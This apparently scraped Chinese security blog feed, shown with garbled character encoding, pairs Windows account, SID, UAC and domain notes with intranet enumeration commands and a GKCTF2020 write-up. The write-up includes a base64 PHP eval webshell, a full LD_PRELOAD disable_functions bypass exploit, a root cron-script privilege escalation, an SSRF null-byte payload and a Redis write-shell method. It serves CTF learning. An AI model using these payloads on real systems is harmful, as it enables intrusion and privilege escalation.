ä»»ä½•é€šè¿‡ç½‘ç»œè¿æ¥æ­¤è®¡ç®—æœºçš„ç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚ Creator Owner æ–‡ä»¶å¤¹ã€æ–‡ä»¶æˆ–æ‰“å°æ–‡ä»¶ç­‰èµ„æºçš„åˆ›å»ºè€…ï¼Œå°±æ˜¯è¯¥èµ„æºçš„Creator Ownerï¼ˆåˆ›å»ºæ‰€æœ‰è€…ï¼‰ã€‚ä¸è¿‡ï¼Œå¦‚æœåˆ›å»ºè€…æ˜¯å±äºAdministratorsç»„å†…çš„æˆå‘˜ï¼Œåˆ™å…¶Creator Ownerä¸ºAdministratorsç»„ã€‚ Anonymous Logon ä»»ä½•æœªåˆ©ç”¨æœ‰æ•ˆçš„Windows Server 2003å¸æˆ·è¿æ¥çš„ç”¨æˆ·ï¼Œéƒ½å±äºè¿™ä¸ªç»„ã€‚æ³¨æ„ï¼Œåœ¨windows 2003å†…ï¼ŒEverone ç»„å†…å¹¶ä¸åŒ…å«â€œAnonymous Logonâ€ç»„ SIDæ¦‚å¿µSIDä¹Ÿå°±æ˜¯å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSecurity Identifiersï¼‰ï¼Œæ˜¯æ ‡è¯†ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœºå¸æˆ·çš„å”¯ä¸€çš„å·ç ã€‚åœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºè¯¥å¸æˆ·æ—¶ï¼Œå°†ç»™ç½‘ç»œä¸Šçš„æ¯ä¸€ä¸ªå¸æˆ·å‘å¸ƒä¸€ä¸ªå”¯ä¸€çš„ SIDã€‚Windows 2000 ä¸­çš„å†…éƒ¨è¿›ç¨‹å°†å¼•ç”¨å¸æˆ·çš„ SID è€Œä¸æ˜¯å¸æˆ·çš„ç”¨æˆ·æˆ–ç»„åã€‚å¦‚æœåˆ›å»ºå¸æˆ·ï¼Œå†åˆ é™¤å¸æˆ·ï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„ç”¨æˆ·ååˆ›å»ºå¦ä¸€ä¸ªå¸æˆ·ï¼Œåˆ™æ–°å¸æˆ·å°†ä¸å…·æœ‰æˆæƒç»™å‰ä¸€ä¸ªå¸æˆ·çš„æƒåŠ›æˆ–æƒé™ï¼ŒåŸå› æ˜¯è¯¥å¸æˆ·å…·æœ‰ä¸åŒçš„ SID å·ã€‚å®‰å…¨æ ‡è¯†ç¬¦ä¹Ÿè¢«ç§°ä¸ºå®‰å…¨ ID æˆ– SIDã€‚ ä½œç”¨ç”¨æˆ·é€šè¿‡éªŒè¯åï¼Œç™»é™†è¿›ç¨‹ä¼šç»™ç”¨æˆ·ä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼Œè¯¥ä»¤ç‰Œç›¸å½“äºç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºçš„ç¥¨è¯ï¼Œå½“ç”¨æˆ·è¯•å›¾è®¿é—®ç³»ç»Ÿèµ„æºæ—¶ï¼Œå°†è®¿é—®ä»¤ç‰Œæä¾›ç»™ Windows NTï¼Œç„¶å Windows NT æ£€æŸ¥ç”¨æˆ·è¯•å›¾è®¿é—®å¯¹è±¡ä¸Šçš„è®¿é—®æ§åˆ¶åˆ—è¡¨ã€‚å¦‚æœç”¨æˆ·è¢«å…è®¸è®¿é—®è¯¥å¯¹è±¡ï¼ŒWindows NTå°†ä¼šåˆ†é…ç»™ç”¨æˆ·é€‚å½“çš„è®¿é—®æƒé™ã€‚ è®¿é—®ä»¤ç‰Œæ˜¯ç”¨æˆ·åœ¨é€šè¿‡éªŒè¯çš„æ—¶å€™æœ‰ç™»é™†è¿›ç¨‹æ‰€æä¾›çš„ï¼Œæ‰€ä»¥æ”¹å˜ç”¨æˆ·çš„æƒé™éœ€è¦æ³¨é”€åé‡æ–°ç™»é™†ï¼Œé‡æ–°è·å–è®¿é—®ä»¤ç‰Œã€‚ ç»„æˆå¦‚æœå­˜åœ¨ä¸¤ä¸ªåŒæ ·SIDçš„ç”¨æˆ·ï¼Œè¿™ä¸¤ä¸ªå¸æˆ·å°†è¢«é‰´åˆ«ä¸ºåŒä¸€ä¸ªå¸æˆ·ï¼ŒåŸç†ä¸Šå¦‚æœå¸æˆ·æ— é™åˆ¶å¢åŠ çš„æ—¶å€™ï¼Œä¼šäº§ç”ŸåŒæ ·çš„SIDï¼Œåœ¨é€šå¸¸çš„æƒ…å†µä¸‹SIDæ˜¯å”¯ä¸€çš„ï¼Œä»–ç”±è®¡ç®—æœºåã€å½“å‰æ—¶é—´ã€å½“å‰ç”¨æˆ·æ€çº¿ç¨‹çš„CPUè€—è´¹æ—¶é—´çš„æ€»å’Œä¸‰ä¸ªå‚æ•°å†³å®šä»¥ä¿è¯å®ƒçš„å”¯ä¸€æ€§ã€‚ ä¸€ä¸ªå®Œæ•´çš„SIDåŒ…æ‹¬ï¼š ç”¨æˆ·å’Œç»„çš„å®‰å…¨æè¿° 48-bitçš„ID authority ä¿®è®¢ç‰ˆæœ¬ å¯å˜çš„éªŒè¯å€¼Variable sub-authority values ä¾‹ï¼šS-1-5-21-310440588-250036847-580389505-500 æˆ‘ä»¬æ¥å…ˆåˆ†æè¿™ä¸ªé‡è¦çš„SIDã€‚ç¬¬ä¸€é¡¹Sè¡¨ç¤ºè¯¥å­—ç¬¦ä¸²æ˜¯SIDï¼›ç¬¬äºŒé¡¹æ˜¯SIDçš„ç‰ˆæœ¬å·ï¼Œå¯¹äº2000æ¥è¯´ï¼Œè¿™ä¸ªå°±æ˜¯1ï¼›ç„¶åæ˜¯æ ‡å¿—ç¬¦çš„é¢å‘æœºæ„ï¼ˆidentifier authorityï¼‰ï¼Œå¯¹äº2000å†…çš„å¸æˆ·ï¼Œé¢å‘æœºæ„å°±æ˜¯NTï¼Œå€¼æ˜¯5ã€‚ç„¶åè¡¨ç¤ºä¸€ç³»åˆ—çš„å­é¢å‘æœºæ„ï¼Œå‰é¢å‡ é¡¹æ˜¯æ ‡å¿—åŸŸçš„ï¼Œæœ€åä¸€ä¸ªæ ‡å¿—ç€åŸŸå†…çš„å¸æˆ·å’Œç»„ã€‚ SIDçš„è·å¾—å¼€å§‹ï¼è¿è¡Œï¼regedt32ï¼HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Builtin\\Aliases\\Membersï¼Œæ‰¾åˆ°æœ¬åœ°çš„åŸŸçš„ä»£ç ï¼Œå±•å¼€åï¼Œå¾—åˆ°çš„å°±æ˜¯æœ¬åœ°å¸å·çš„æ‰€æœ‰SIDåˆ—è¡¨ã€‚ å…¶ä¸­å¾ˆå¤šå€¼éƒ½æ˜¯å›ºå®šçš„ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ª000001F4ï¼ˆ16è¿›åˆ¶ï¼‰ï¼Œæ¢ç®—æˆåè¿›åˆ¶æ˜¯500ï¼Œè¯´æ˜æ˜¯ç³»ç»Ÿå»ºç«‹çš„å†…ç½®ç®¡ç†å‘˜å¸å·administratorï¼Œ000001F5æ¢ç®—æˆ10è¿›åˆ¶æ˜¯501ï¼Œä¹Ÿå°±æ˜¯GUESTå¸å·äº†ï¼Œè¯¦ç»†çš„å‚ç…§åé¢çš„åˆ—è¡¨ã€‚ è¿™ä¸€é¡¹é»˜è®¤æ˜¯systemå¯ä»¥å®Œå…¨æ§åˆ¶ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦è·å¾—è¿™ä¸ªéœ€è¦ä¸€ä¸ªSystemçš„Cmdçš„Shellçš„åŸå› äº†ï¼Œå½“ç„¶å¦‚æœæƒé™è¶³å¤Ÿçš„è¯ä½ å¯ä»¥æŠŠä½ è¦æ·»åŠ çš„å¸å·æ·»åŠ è¿›å»ã€‚ æˆ–è€…ä½¿ç”¨Support Toolsçš„Regå·¥å…·ï¼š 1reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList è¿˜æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥è·å¾—SIDå’Œç”¨æˆ·åç§°çš„å¯¹åº”å…³ç³»ï¼š Regedt32:HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion \\ProfileList è¿™ä¸ªæ—¶å€™å¯ä»¥åœ¨å·¦ä¾§çš„çª—å£çœ‹åˆ°SIDçš„å€¼ï¼Œå¯ä»¥åœ¨å³ä¾§çš„çª—å£ä¸­ProfileImagePathçœ‹åˆ°ä¸åŒçš„SIDå…³è”çš„ç”¨æˆ·åï¼Œæ¯”å¦‚%SystemDrive%\\Documents and Settings\\Administrator.momoè¿™ä¸ªå¯¹åº”çš„å°±æ˜¯æœ¬åœ°æœºå™¨çš„ç®¡ç†å‘˜SID%SystemDrive%\\Documents and Settings\\Administrator.domainè¿™ä¸ªå°±æ˜¯å¯¹åº”åŸŸçš„ç®¡ç†å‘˜çš„å¸æˆ· å¦å¤–å¾®è½¯çš„ResourceKité‡Œé¢ä¹Ÿæä¾›äº†å·¥å…·getsidï¼Œsysinternalsçš„å·¥å…·åŒ…é‡Œé¢ä¹Ÿæœ‰Psgetsidï¼Œå…¶å®æ„Ÿè§‰åŸç†éƒ½æ˜¯è¯»å–æ³¨å†Œè¡¨çš„å€¼ç½¢äº†ï¼Œå°±æ˜¯çœäº†ä¸€äº›äº‹æƒ…ã€‚ å¸¸ç”¨å‘½ä»¤12345678910111213141516171819202122232425262728net user # æŸ¥çœ‹ç”¨æˆ·net user Administrator # æŸ¥çœ‹administratorç”¨æˆ·è¯¦ç»†ä¿¡æ¯net user moonback 1314 /add # æ·»åŠ ç”¨æˆ·åmoonbackå¯†ç ä¸º1314çš„ç”¨æˆ·ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™(æ³¨æ„å¯†ç å¤æ‚åº¦)net user moonback /delete # åˆ é™¤moonbackç”¨æˆ·net user moonback /active:no # ç¦ç”¨moonbackç”¨æˆ·net user moonback /active:yes # å¯ç”¨moonbackç”¨æˆ·net user moonback /passwordchg:yes # ç”¨æˆ·moonbackå¯ä»¥æ”¹å˜å¯†ç net user moonback /passwordreq:yes # ç”¨æˆ·moonbackå¿…é¡»æ‹¥æœ‰å¯†ç net user moonback /expires:never # ç”¨æˆ·moonbackæ°¸ä¸è¿‡æœŸnet localgroup # æŸ¥çœ‹ç”¨æˆ·ç»„net localgroup Administrators # æŸ¥çœ‹ç®¡ç†å‘˜ç»„æˆå‘˜net localgroup Administrators moonback /del # å°†moonbackç”¨æˆ·ä»ç®¡ç†å‘˜ç»„åˆ é™¤net localgroup Administrators moonback /add # å°†moonbackç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„net localgroup hack /add # æ·»åŠ hackç”¨æˆ·ç»„whoami /user # æŸ¥çœ‹SIDquery user # æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·tasklist # æŸ¥çœ‹è¿›ç¨‹tasklist /svc # æŸ¥çœ‹è¿›ç¨‹åŠå¯¹åº”çš„pidå’ŒæœåŠ¡tasklist /svc | findstr &quot;TeamService.exe&quot; # æŸ¥çœ‹è¿œç¨‹æ¡Œé¢è¿›ç¨‹taskkill /f /im pid # å¼ºåˆ¶æ€æ­»pidå·è¿›ç¨‹netstat -ano # æ˜¾ç¤ºç½‘ç»œä¿¡æ¯netstat -ano | findstr &quot;3389&quot; # æŸ¥çœ‹3389ç«¯å£çŠ¶æ€REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # å¼€å¯3389REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f # å…³é—­3389REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server\\WinStations\\RDP-Tcp /v PortNumber # æŸ¥çœ‹è¿œç¨‹æ¡Œé¢ç«¯å£ver # æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ï¼Œ5.1=&gt;2003 5.2=&gt;xp 6.1=&gt;win7ã€2008 6.2=&gt;win8ã€2012 10=&gt;win10systeminfo # æŸ¥çœ‹windowsè¯¦ç»†ä¿¡æ¯ Windowsè®¤è¯åŠå¯†ç Windowsé˜²æŠ¤æ–¹æ¡ˆUACWindows Vista å¼€å§‹å¼•å…¥äº† UAC(User Account Controlï¼Œç”¨æˆ·è´¦æˆ·æ§åˆ¶)ï¼Œæœ€ç›´è§‚çš„è¡¨ç°æ˜¯å½“åº”ç”¨è¯•å›¾å®‰è£…è½¯ä»¶æˆ–æ›´æ”¹è®¡ç®—æœºã€æˆ–è€…æ›´æ”¹äº† Windows è®¾ç½®æ—¶å°†å¼¹å‡º UAC æç¤ºæ¡†ã€‚ ä» Windows Vista å¼€å§‹ï¼Œè¿›ç¨‹åœ¨åˆ›å»ºçš„æ—¶å€™ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼ˆAccess Tokenï¼‰ï¼Œè¿™ä¸ªä»¤ç‰Œæœ‰å››ä¸ªå®Œæ•´æ€§çº§åˆ«ï¼š Systemï¼ˆç³»ç»Ÿï¼‰ Highï¼ˆé«˜ï¼‰ Mediumï¼ˆä¸­ï¼‰ Lowï¼ˆä½ï¼‰ System ä»¤ç‰Œæ˜¯å¯¹ç³»ç»Ÿå®Œå…¨æ“ä½œçš„ä»¤ç‰Œï¼Œå¯¹åº” SYSTEM ç”¨æˆ·æ‹¥æœ‰çš„æœ€é«˜æƒé™ï¼Œå¯ä»¥å¯¹ Windows æ“ä½œç³»ç»Ÿåšä»»ä½•äº‹ã€‚é€šå¸¸ä¸€ä¸ªæœåŠ¡è¿›ç¨‹ä¼šä»¥ SYSTEM ç”¨æˆ·å¯åŠ¨ï¼Œæ‹¿åˆ° System ä»¤ç‰Œã€‚ High å¯¹åº” Administrators ç»„æ‹¥æœ‰çš„æœ€é«˜æƒé™ï¼Œä¹Ÿå°±æ˜¯å‰é¢æ‰€è¯´çš„ Administrator ç”¨æˆ·å’Œç”¨æˆ·è‡ªå·±åˆ›å»ºçš„ç®¡ç†å‘˜è´¦æˆ·çš„æƒé™çº§åˆ«ã€‚æ­¤æƒé™çº§åˆ«ç”¨æ¥ç®¡ç†è®¡ç®—æœºï¼Œå¯ä»¥ä¿®æ”¹å…¶ä»–ç”¨æˆ·ï¼Œå¯ä»¥ä¿®æ”¹ç³»ç»Ÿçš„è®¾ç½®ï¼Œè¿™äº›è®¾ç½®å¯èƒ½ä¼šé€ æˆå®‰å…¨é—®é¢˜ï¼ˆæ¯”å¦‚æ›´æ”¹ç³»ç»Ÿæ—¶é—´å¯èƒ½å¯¼è‡´æ€æ¯’è½¯ä»¶å¤±æ•ˆï¼‰ã€‚ Medium å¯¹åº” Users ç»„æ‹¥æœ‰çš„æœ€é«˜æƒé™ï¼Œä¹Ÿå°±æ˜¯å‰é¢æ‰€è¯´çš„ç”¨æˆ·è‡ªå·±åˆ›å»ºçš„æ ‡å‡†ç”¨æˆ·ã€‚æ­¤æƒé™çº§åˆ«ç”¨æ¥æ—¥å¸¸ä½¿ç”¨ã€‚Medium æƒé™åœ¨ Windows Vistaï¼ˆå®é™…ä¸Šæ˜¯å…¶å†…æ ¸ NT6ï¼‰ä¸­ç›¸æ¯”äºä¹‹å‰ç‰ˆæœ¬çš„ Windows æœ‰ä¸€äº›æƒé™çš„æå‡ï¼Œä¸å±åŠç³»ç»Ÿå®‰å…¨æ€§çš„æ“ä½œåœ¨ Medium ä¸‹å³å¯ä»¥å®Œæˆï¼Œä¸éœ€è¦åˆ‡æ¢åˆ° High çº§åˆ«ã€‚Users ç»„çš„ç”¨æˆ·æ˜¯æ²¡æœ‰ High å’Œ System ä»¤ç‰Œçš„ï¼Œç¨‹åºåœ¨æ­¤ç”¨æˆ·è´¦æˆ·ä¸‹ï¼Œæ— è®ºå¦‚ä½•ä¹Ÿæ— æ³•æ‹¿åˆ° High å’Œ System ä»¤ç‰Œçš„ï¼Œå› ä¸ºè¿™ä¸ªç”¨æˆ·æ²¡æœ‰è¿™æ ·çš„ä»¤ç‰Œï¼›å¦‚æœè¦æƒé™æå‡ï¼Œéœ€è¦è¾“å…¥ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œè€Œè¿™æ—¶æ‹¿åˆ°çš„æ˜¯è¿™ä¸ªç®¡ç†å‘˜è´¦å·çš„ High å’Œ System ä»¤ç‰Œã€‚ Low å¹¶ä¸å¯¹åº”è€…ä¸€ä¸ªç”¨æˆ·ç»„ï¼Œè¿™æ˜¯ä¸ºäº†ä¸€äº›éœ€è¦ç‰¹æ®Šä¿æŠ¤çš„åº”ç”¨ç¨‹åºå‡†å¤‡çš„ã€‚æœ‰äº›åº”ç”¨å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œé‚£ä¹ˆä½¿ç”¨ Low ä»¤ç‰Œå¯åŠ¨è¿™äº›åº”ç”¨ç¨‹åºï¼Œå¯ä»¥æœ€å¤§ç¨‹åº¦å‡å°‘åˆ©ç”¨è¿™äº›åº”ç”¨å¯¹ç³»ç»Ÿé€ æˆæ”»å‡»ã€‚æ¯”å¦‚ IE æµè§ˆå™¨çš„é¡µé¢è¿›ç¨‹ä½¿ç”¨ Low ä»¤ç‰Œè¿è¡Œï¼Œå…¶å¯¹ç³»ç»Ÿå¾ˆéš¾åšå‡ºä»€ä¹ˆæ”¹åŠ¨ï¼Œç”šè‡³ä¹Ÿå½±å“ä¸äº†å½“å‰ç”¨æˆ·çš„æ–‡ä»¶ï¼›å½“éœ€è¦éœ€ç³»ç»Ÿè®¡ç®—æœºè¿›è¡Œäº¤äº’çš„æ—¶å€™ï¼Œä¼šä¸ IE çš„ UI è¿›ç¨‹ï¼ˆMedium ä»¤ç‰Œï¼‰è¿›è¡Œé€šä¿¡ï¼Œè¯·æ±‚ååŠ©å®Œæˆã€‚ å½“ UAC æ˜¯å¼€å¯çŠ¶æ€ï¼Œæ— è®ºæ˜¯ç®¡ç†å‘˜è´¦æˆ·è¿˜æ˜¯æ ‡å‡†è´¦æˆ·ï¼ŒWindows èµ„æºç®¡ç†å™¨è¿›ç¨‹ï¼ˆexplorer.exeï¼‰éƒ½æ˜¯ä»¥ Medium ä»¤ç‰Œå¯åŠ¨è¿›ç¨‹ã€‚ç”±äºå­è¿›ç¨‹é€šå¸¸èƒ½å¤Ÿç»§æ‰¿çˆ¶è¿›ç¨‹çš„ä»¤ç‰Œå®Œæ•´æ€§çº§åˆ«ï¼Œæ‰€ä»¥è¿™æ ·çš„è®¾å®šå¯ä»¥é˜²æ­¢ç”¨æˆ·åŒå‡»æ‰“å¼€çš„ç¨‹åºå¾—åˆ°è¿‡é«˜çš„ä»¤ç‰Œï¼Œä»è€Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å±åŠç³»ç»Ÿå®‰å…¨ã€‚ ASRApplockeråŸŸå’Œå·¥ä½œç»„å·¥ä½œç»„æ‰€æœ‰çš„è®¡ç®—æœºéƒ½æ˜¯å¯¹ç­‰çš„ï¼Œæ²¡æœ‰è®¡ç®—æœºå¯ä»¥æ§åˆ¶å¦ä¸€å°è®¡ç®—æœºã€‚ æ¯å°è®¡ç®—æœºéƒ½å…·æœ‰ä¸€ç»„ç”¨æˆ·å¸æˆ·ã€‚è‹¥è¦ç™»å½•åˆ°å·¥ä½œç»„ä¸­çš„ä»»ä½•è®¡ç®—æœºï¼Œæ‚¨å¿…é¡»å…·æœ‰è¯¥è®¡ç®—æœºä¸Šçš„å¸æˆ·ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¡ç®—æœºçš„æ•°é‡ä¸è¶…è¿‡äºŒåå°ã€‚å·¥ä½œç»„ä¸å—å¯†ç ä¿æŠ¤ã€‚æ‰€æœ‰çš„è®¡ç®—æœºå¿…é¡»åœ¨åŒä¸€æœ¬åœ°ç½‘ç»œæˆ–å­ç½‘ä¸­ã€‚ åŸŸæœ‰ä¸€å°æˆ–å¤šå°è®¡ç®—æœºä¸ºæœåŠ¡å™¨ã€‚ç½‘ç»œç®¡ç†å‘˜ä½¿ç”¨æœåŠ¡å™¨æ§åˆ¶åŸŸä¸­æ‰€æœ‰è®¡ç®—æœºçš„å®‰å…¨å’Œæƒé™ã€‚è¿™ä½¿å¾—æ›´å®¹æ˜“è¿›è¡Œæ›´æ”¹ï¼Œå› ä¸ºæ›´æ”¹ä¼šè‡ªåŠ¨åº”ç”¨åˆ°æ‰€æœ‰çš„è®¡ç®—æœºã€‚åŸŸç”¨æˆ·åœ¨æ¯æ¬¡è®¿é—®åŸŸæ—¶å¿…é¡»æä¾›å¯†ç æˆ–å…¶ä»–å‡­æ®ã€‚ å¦‚æœå…·æœ‰åŸŸä¸Šçš„ç”¨æˆ·å¸æˆ·ï¼Œæ‚¨å°±å¯ä»¥ç™»å½•åˆ°åŸŸä¸­çš„ä»»ä½•è®¡ç®—æœºï¼Œè€Œæ— éœ€å…·æœ‰è¯¥è®¡ç®—æœºä¸Šçš„å¸æˆ·ã€‚ ç”±äºç½‘ç»œç®¡ç†å‘˜ç»å¸¸è¦ç¡®ä¿è®¡ç®—æœºä¹‹é—´çš„ä¸€è‡´æ€§ï¼Œæ‰€ä»¥ï¼Œåªèƒ½å¯¹è®¡ç®—æœºçš„è®¾ç½®è¿›è¡Œæœ‰é™åˆ¶åœ°æ›´æ”¹ã€‚ ä¸€ä¸ªåŸŸä¸­å¯ä»¥æœ‰å‡ åƒå°è®¡ç®—æœºã€‚è®¡ç®—æœºå¯ä»¥ä½äºä¸åŒçš„æœ¬åœ°ç½‘ç»œä¸­ã€‚ åŸŸæ˜¯ç”±åŸŸæ§åˆ¶å™¨(Domain Controller)å’Œæˆå‘˜è®¡ç®—æœºç»„æˆï¼ŒåŸŸæ§åˆ¶å™¨å°±æ˜¯å®‰è£…äº†æ´»åŠ¨ ç›®å½•(Active Directory)çš„è®¡ç®—æœºã€‚æ´»åŠ¨ç›®å½•æä¾›äº†å­˜å‚¨ç½‘ç»œä¸Šå¯¹è±¡ä¿¡æ¯å¹¶ä½¿ç”¨ç½‘ç»œä½¿ç”¨è¯¥æ•°æ®çš„æ–¹æ³•ã€‚ å†…ç½‘å¸¸ç”¨å‘½ä»¤12345678910111213141516171819#å°†Windows Server Core åŠ å…¥åˆ°åŸŸnetdom renamecomputer FileServer /newname:ProfileServer #æ›´æ”¹è®¡ç®—æœºåç§°ä¸ºProfileServernetsh interface ipv4 set address name=&quot;æœ¬åœ°è¿æ¥&quot; source=static addr=192.168.10.212 mask= 255.255.255.0 gateway=192.168.10.1netsh interface ipv4 set dnsserver &quot;æœ¬åœ°è¿æ¥&quot; static 192.168.10.200 primarynetdom join %computername% /domain:http://ESS.COM /userd:administrator /passwordD:a1! /REBoot:5net user ------&gt; æœ¬æœºç”¨æˆ·åˆ—è¡¨net localhroup administrators ------&gt; æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·]net user /domain ------&gt; æŸ¥è¯¢åŸŸç”¨æˆ·net group /domain ------&gt; æŸ¥è¯¢åŸŸé‡Œé¢çš„å·¥ä½œç»„net group &quot;domain admins&quot; /domain ------&gt; æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„net localgroup administrators /domain ------&gt; ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜net localgroup administrators workgroup\\user001 /add -----&gt;åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœºnet group &quot;Domain controllers&quot; -------&gt; æŸ¥çœ‹åŸŸæ§åˆ¶å™¨(å¦‚æœæœ‰å¤šå°)ipconfig /all ------&gt; æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰net view ------&gt; æŸ¥è¯¢åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨net view /domain ------&gt; æŸ¥è¯¢åŸŸåˆ—è¡¨net view /domain:domainname -----&gt; æŸ¥çœ‹workgroupåŸŸä¸­è®¡ç®—æœºåˆ—è¡¨ å‚è€ƒï¼š https://www.cnblogs.com/lip-blog/p/7658839.html https://blog.csdn.net/WPwalter/article/details/89838881 https://zhuanlan.zhihu.com/p/32287774 https://www.cnblogs.com/mq0036/p/3518542.html","categories":[],"tags":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"http://www.m00nback.xyz/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"GKCTF2020 writeup","slug":"GKCTF2020-writeup","date":"2020-05-24T02:36:26.000Z","updated":"2020-05-26T02:28:51.104Z","comments":true,"path":"2020/05/24/GKCTF2020-writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/05/24/GKCTF2020-writeup/","excerpt":"ç”±é˜²ç¾ç§‘æŠ€å­¦é™¢&amp;Bugforä¸¾åŠçš„æ¯”èµ›ï¼Œè®°ä¸€ä¸‹ï¼","text":"ç”±é˜²ç¾ç§‘æŠ€å­¦é™¢&amp;Bugforä¸¾åŠçš„æ¯”èµ›ï¼Œè®°ä¸€ä¸‹ï¼ webCheckINbase64åŠ å¯†ä¸€ä¸‹ï¼Œå…ˆå¾€/tmpä¸‹å†™ä¸ªé©¬ï¼Œç„¶ååŒ…å«è¿™ä¸ªé©¬ï¼Œèšå‰‘è¿ä¸ŠLD_PRELOAD bypass disable_function 12file_put_contents(&quot;/tmp/1.php&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));include(&#x27;/tmp/moonback&#x27;); è´´ä¸€ä¸‹php exp: 12345678910111213&lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path);?&gt; è€å…«å°è¶…å¸‚å„¿é»˜è®¤å¯†ç ï¼Œadmin shopxoï¼Œåå°ä¸Šä¼ ä¸»é¢˜getshell èšå‰‘è¿ä¸Šå‘ç°flagæ˜¯å‡çš„ï¼Œhintæç¤ºGET root,è¯•äº†å¥½å¤šåŠæ³•éƒ½ä¸è¡Œ åæ¥å‘ç°æœ‰auto.sh 12#!/bin/shwhile true; do (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; done çœ‹äº†ä¸‹è¿›ç¨‹æ˜¯ä»¥rootè¿è¡Œçš„ï¼Œå¹¶ä¸”æ‰€æœ‰è€…æ˜¯root makeflaghint.py: 12345678910import osimport ioimport timeos.system(&quot;whoami&quot;)gk1=str(time.ctime())gk=&quot;\\nGet The RooT,The Date Is Useful!&quot;f=io.open(&quot;/flag.hint&quot;, &quot;rb+&quot;)f.write(str(gk1))f.write(str(gk))f.close() è¿™ä¸ªæ–‡ä»¶å°±å¾ˆç‰¹æ®Šäº† æ‰€æœ‰ç”¨æˆ·å¯¹å®ƒéƒ½å¯å†™ï¼Œå› ä¸ºä¸Šé¢auto.shæ˜¯ä»¥rootè¿è¡Œçš„ï¼Œå¹¶ä¸”é‡Œé¢è°ƒç”¨äº†makeflaghint.pyï¼Œç›¸å½“äºrootè¿è¡Œmakeflaghint.pyï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹ä¸‹å†…å®¹ï¼Œå¢åŠ ä¸€è¡Œ 1os.system(&#x27;cat /root/flag &gt; a&#x27;) å°±èƒ½getflagäº†ï¼ŒçœŸæ²¡æƒ³åˆ°ï¼ï¼ï¼ cveç‰ˆç­¾åˆ°hintè¯´cve-2020-7066ï¼Œçœ‹ä¸€ä¸‹ä»‹ç»ï¼š ç„¶ååˆåœ¨é¢˜ç›®å“åº”å¤´é‡Œçœ‹åˆ° ç„¶åæ„é€ flagå°±å‡ºæ¥äº†ï¼Œæ²¡ææ‡‚23333 1?url&#x3D;http:&#x2F;&#x2F;127.0.0.123%00.ctfhub.com EZä¸‰å‰‘å®¢-EzWebæŸ¥çœ‹æºç ï¼Œå‘ç°?secretï¼Œè®¿é—®å‘ç°ç»™å‡ºäº†é¶æœºip ç›´æ¥ç”¨æœ¬æœºipè¯•å‘ç° bp fuzzä¸€ä¸‹ï¼š åœ¨173.167.10.11çœ‹åˆ° æç¤ºè¦æµ‹è¯•ç«¯å£ï¼Œè¯•ä¸‹ redisæœªæˆæƒè®¿é—®ï¼Œå†™shellï¼Œç›´æ¥ç”¨Gopherusç”Ÿæˆpayload æ³¨æ„è¦urläºŒæ¬¡ç¼–ç  cryptoå°å­¦ç”Ÿçš„å¯†ç å­¦ä»¿å°„å¯†ç ï¼Œç›´æ¥åœ¨çº¿ç½‘ç«™è§£ï¼š https://aliyunvi.com/affine åŠ å¯†å½¢å¼ï¼š 1e(x)&#x3D;ax+b (mod 26) 